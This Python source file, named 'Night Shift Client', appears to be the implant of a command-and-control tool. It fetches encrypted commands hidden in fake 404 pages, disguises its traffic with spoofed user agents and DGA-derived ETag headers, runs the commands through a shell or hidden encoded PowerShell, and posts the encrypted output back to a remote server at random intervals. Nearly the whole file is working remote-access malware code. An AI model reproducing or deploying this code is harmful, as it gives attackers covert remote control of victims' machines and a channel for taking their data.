#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Night Shift Client

import aiohttp
import asyncio
import base64
import json
import os
import subprocess
import sys
import time
from colorama import Fore, Back, Style
from datetime import datetime
from random import randrange
from subprocess import (PIPE, Popen)
from nightshift_utility import NightShift_Cipher, NightShift_DGA
from nightshift_client_init import NightShift_Init_Check

class NightShift_Client():
    
    def run(self):
        try:
            ns_init_json_path = 'ns_init_call.json'
            ns_init_chkr = NightShift_Init_Check()
            ns_get_cipher = NightShift_Cipher()
            ns_init_resp = ns_init_chkr.ns_init_check()
            ns_initchk_tf = ns_init_resp[0]
            ns_get_ua = ns_init_resp[1]
            ns_post_ua = ns_init_resp[2]
            ns_fof_url = ns_init_resp[3]
            ns_post_url = ns_init_resp[4]
            if ns_initchk_tf == True:
                 with open(ns_init_json_path) as ns_init_f:
                     ns_init_data = json.load(ns_init_f)
                     ns_host_hash = ns_init_data.get('host_hash')
                     ns_host_data = ns_init_data.get('host_data')
                     ns_host_os = ns_host_data.get('os_type')
            else:
                print('Something is afoot and we cannot continue')
                sys.exit(1)
            loop = asyncio.get_event_loop()                                                                                                                                                                        
            while True:
                try:
                    ns_data_post_resp = 'No response from server, taking a 30 minute power nap.'
                    ns_ss_sec = 1800
                    ns_fof_html = loop.run_until_complete(self.FourOFour(ns_get_ua,ns_fof_url))
                    ns_payload = ((ns_fof_html.split('HTMLDOC:'))[1].split('HTMLDOC')[0])
                    ns_decrypt_payload = ns_get_cipher.decrypt(ns_payload)
                    ns_json_payload = json.loads(ns_decrypt_payload)
                    ns_host_fof = ns_json_payload['host_404']
                    ns_host_os_fof = ns_json_payload['host_os_404']
                    ns_host_os_cmd_fof = ns_json_payload['host_cmd_404']
                    ns_host_slpstate_fof = ns_json_payload['host_slpstate_404']
                    if (ns_host_fof == 'ALL' and ns_host_os_fof == 'posix' and ns_host_os_fof == ns_host_os):
                        #print('Do all the Linux things')
                        ns_get_output = self.os_posix(ns_host_os_cmd_fof)
                        ns_json_cmd_output = { 'time': str(ns_get_output[0]),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': ns_get_output[1] }
                        ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
                        ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
                    elif (ns_host_fof == ns_host_hash and ns_host_os_fof == 'posix' and ns_host_os_fof == ns_host_os):
                        #print('Specific Linux Host')
                        ns_get_output = self.os_posix(ns_host_os_cmd_fof)
                        ns_json_cmd_output = { 'time': str(ns_get_output[0]),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': ns_get_output[1] }
                        ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
                        ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
                    elif (ns_host_fof == 'ALL' and ns_host_os_fof == 'nt' and ns_host_os_fof == ns_host_os):
                        #print('Do all the NT things')
                        ns_get_output = self.os_winnt(ns_host_os_cmd_fof)
                        #print(ns_get_output)
                        ns_json_cmd_output = { 'time': str(ns_get_output[0]),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': ns_get_output[1] }
                        #print(ns_json_cmd_output)
                        ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
                        #print(ns_post_data)
                        #ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
                    elif (ns_host_fof == ns_host_hash and ns_host_os_fof == 'nt' and ns_host_os_fof == ns_host_os):
                        #print('Specific NT Host')
                        ns_get_output = self.os_winnt(ns_host_os_cmd_fof)
                        ns_json_cmd_output = { 'time': str(ns_get_output[0]),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': ns_get_output[1] }
                        ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
                        #ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
                    else:
                        ns_data_post_resp = 'Not my turn, I will take a nap'
                    if ns_host_slpstate_fof >= 1:
                        ns_ss_sec = 60 * ns_host_slpstate_fof
                    else:
                        ns_rand_num = randrange(1, 120)
                        ns_ss_sec = 60 * ns_rand_num
                except:
                    pass
                print('[+] {0:s} --> Response from NightShift Server --> {1:s} --> NightShift Client next check-in in --> {2:s} seconds.'.format(str(datetime.now()),ns_data_post_resp,str(ns_ss_sec)))
                time.sleep(ns_ss_sec)
        except KeyboardInterrupt:
            print('\nInterrupted - NightShift Client exited due to a keyboard interrupt.') 
    
    async def FourOFour(self,ns_get_ua,ns_fof_url):

        async with aiohttp.ClientSession() as session:
            ns_url = ns_fof_url
            ns_get_key = NightShift_DGA()
            ns_get_cipher = NightShift_Cipher()
            ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
            ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
            ns_hdrs = {
                    'User-Agent': ns_get_ua,
                    'ETag': ns_hsh_key
                     }
            async with session.get(ns_url, headers=ns_hdrs) as response:
                ns_fof_html = await response.text()
            return ns_fof_html

    async def PostData(self,ns_post_data,ns_post_ua,ns_post_url):

        async with aiohttp.ClientSession() as session:
            ns_url = ns_post_url
            ns_get_key = NightShift_DGA()
            ns_get_cipher = NightShift_Cipher()
            ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
            ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
            ns_hdrs = {
                    'User-Agent': ns_post_ua,
                    'ETag': ns_hsh_key
                     }
            async with session.post(ns_url, headers=ns_hdrs, data=ns_post_data) as response:
                ns_post_resp = await response.text()
            return ns_post_resp

    def os_posix(self, ns_host_os_cmd_fof):
        time_stamp = datetime.now()
        output = subprocess.check_output(ns_host_os_cmd_fof, shell=True).decode('ascii')
        output_b64 = base64.b64encode(bytes(output, 'utf-8')).decode('ascii')
        return time_stamp, output_b64

    def os_winnt(self, ns_host_os_cmd_fof):
        time_stamp = datetime.now()
        ns_ps_cmd = 'powershell -nop -win hidden -noni -enc "' + base64.b64encode(ns_host_os_cmd_fof.encode('utf_16_le')).decode('utf-8') + '"'
        output = (Popen(ns_ps_cmd, stdout=PIPE, shell=True).stdout.read())
        output_b64 = base64.b64encode(bytes(output, 'utf-8')).decode('ascii')
        return time_stamp, output_b64

if __name__ == "__main__":
    print(Fore.GREEN + r"""
    ╔═╗─╔╗───╔╗─╔╗╔═══╦╗───╔═╦╗──╔══╗─────────────────╔╗╔╗─────╔═╗╔═╗──╔╗──────╔╗─╔╗─╔═══╗╔╗
    ║║╚╗║║───║║╔╝╚╣╔═╗║║───║╔╝╚╗─║╔╗║────────────────╔╝╚╣║─────║║╚╝║║──║║──────║║╔╝╚╗║╔═╗║║║
    ║╔╗╚╝╠╦══╣╚╩╗╔╣╚══╣╚═╦╦╝╚╗╔╬╗║╚╝╚╦╗╔╦═╦═╗╔╦═╗╔══╗╚╗╔╣╚═╦══╗║╔╗╔╗╠╦═╝╠═╗╔╦══╣╚╩╗╔╝║║─║╠╣║
    ║║╚╗║╠╣╔╗║╔╗║║╚══╗║╔╗╠╬╗╔╣║╚╝║╔═╗║║║║╔╣╔╗╬╣╔╗╣╔╗║─║║║╔╗║║═╣║║║║║╠╣╔╗║╔╗╬╣╔╗║╔╗║║─║║─║╠╣║
    ║║─║║║║╚╝║║║║╚╣╚═╝║║║║║║║║╚╦╗║╚═╝║╚╝║║║║║║║║║║╚╝║─║╚╣║║║║═╣║║║║║║║╚╝║║║║║╚╝║║║║╚╗║╚═╝║║╚╗
    ╚╝─╚═╩╩═╗╠╝╚╩═╩═══╩╝╚╩╝╚╝╚═╩╝╚═══╩══╩╝╚╝╚╩╩╝╚╩═╗║─╚═╩╝╚╩══╝╚╝╚╝╚╩╩══╩╝╚╩╩═╗╠╝╚╩═╝╚═══╩╩═╝
    ──────╔═╝║───────────────────────────────────╔═╝║───────────────────────╔═╝║ Client
    ──────╚══╝───────────────────────────────────╚══╝───────────────────────╚══╝ version 0.9
            """)
    NightShift_Client().run()
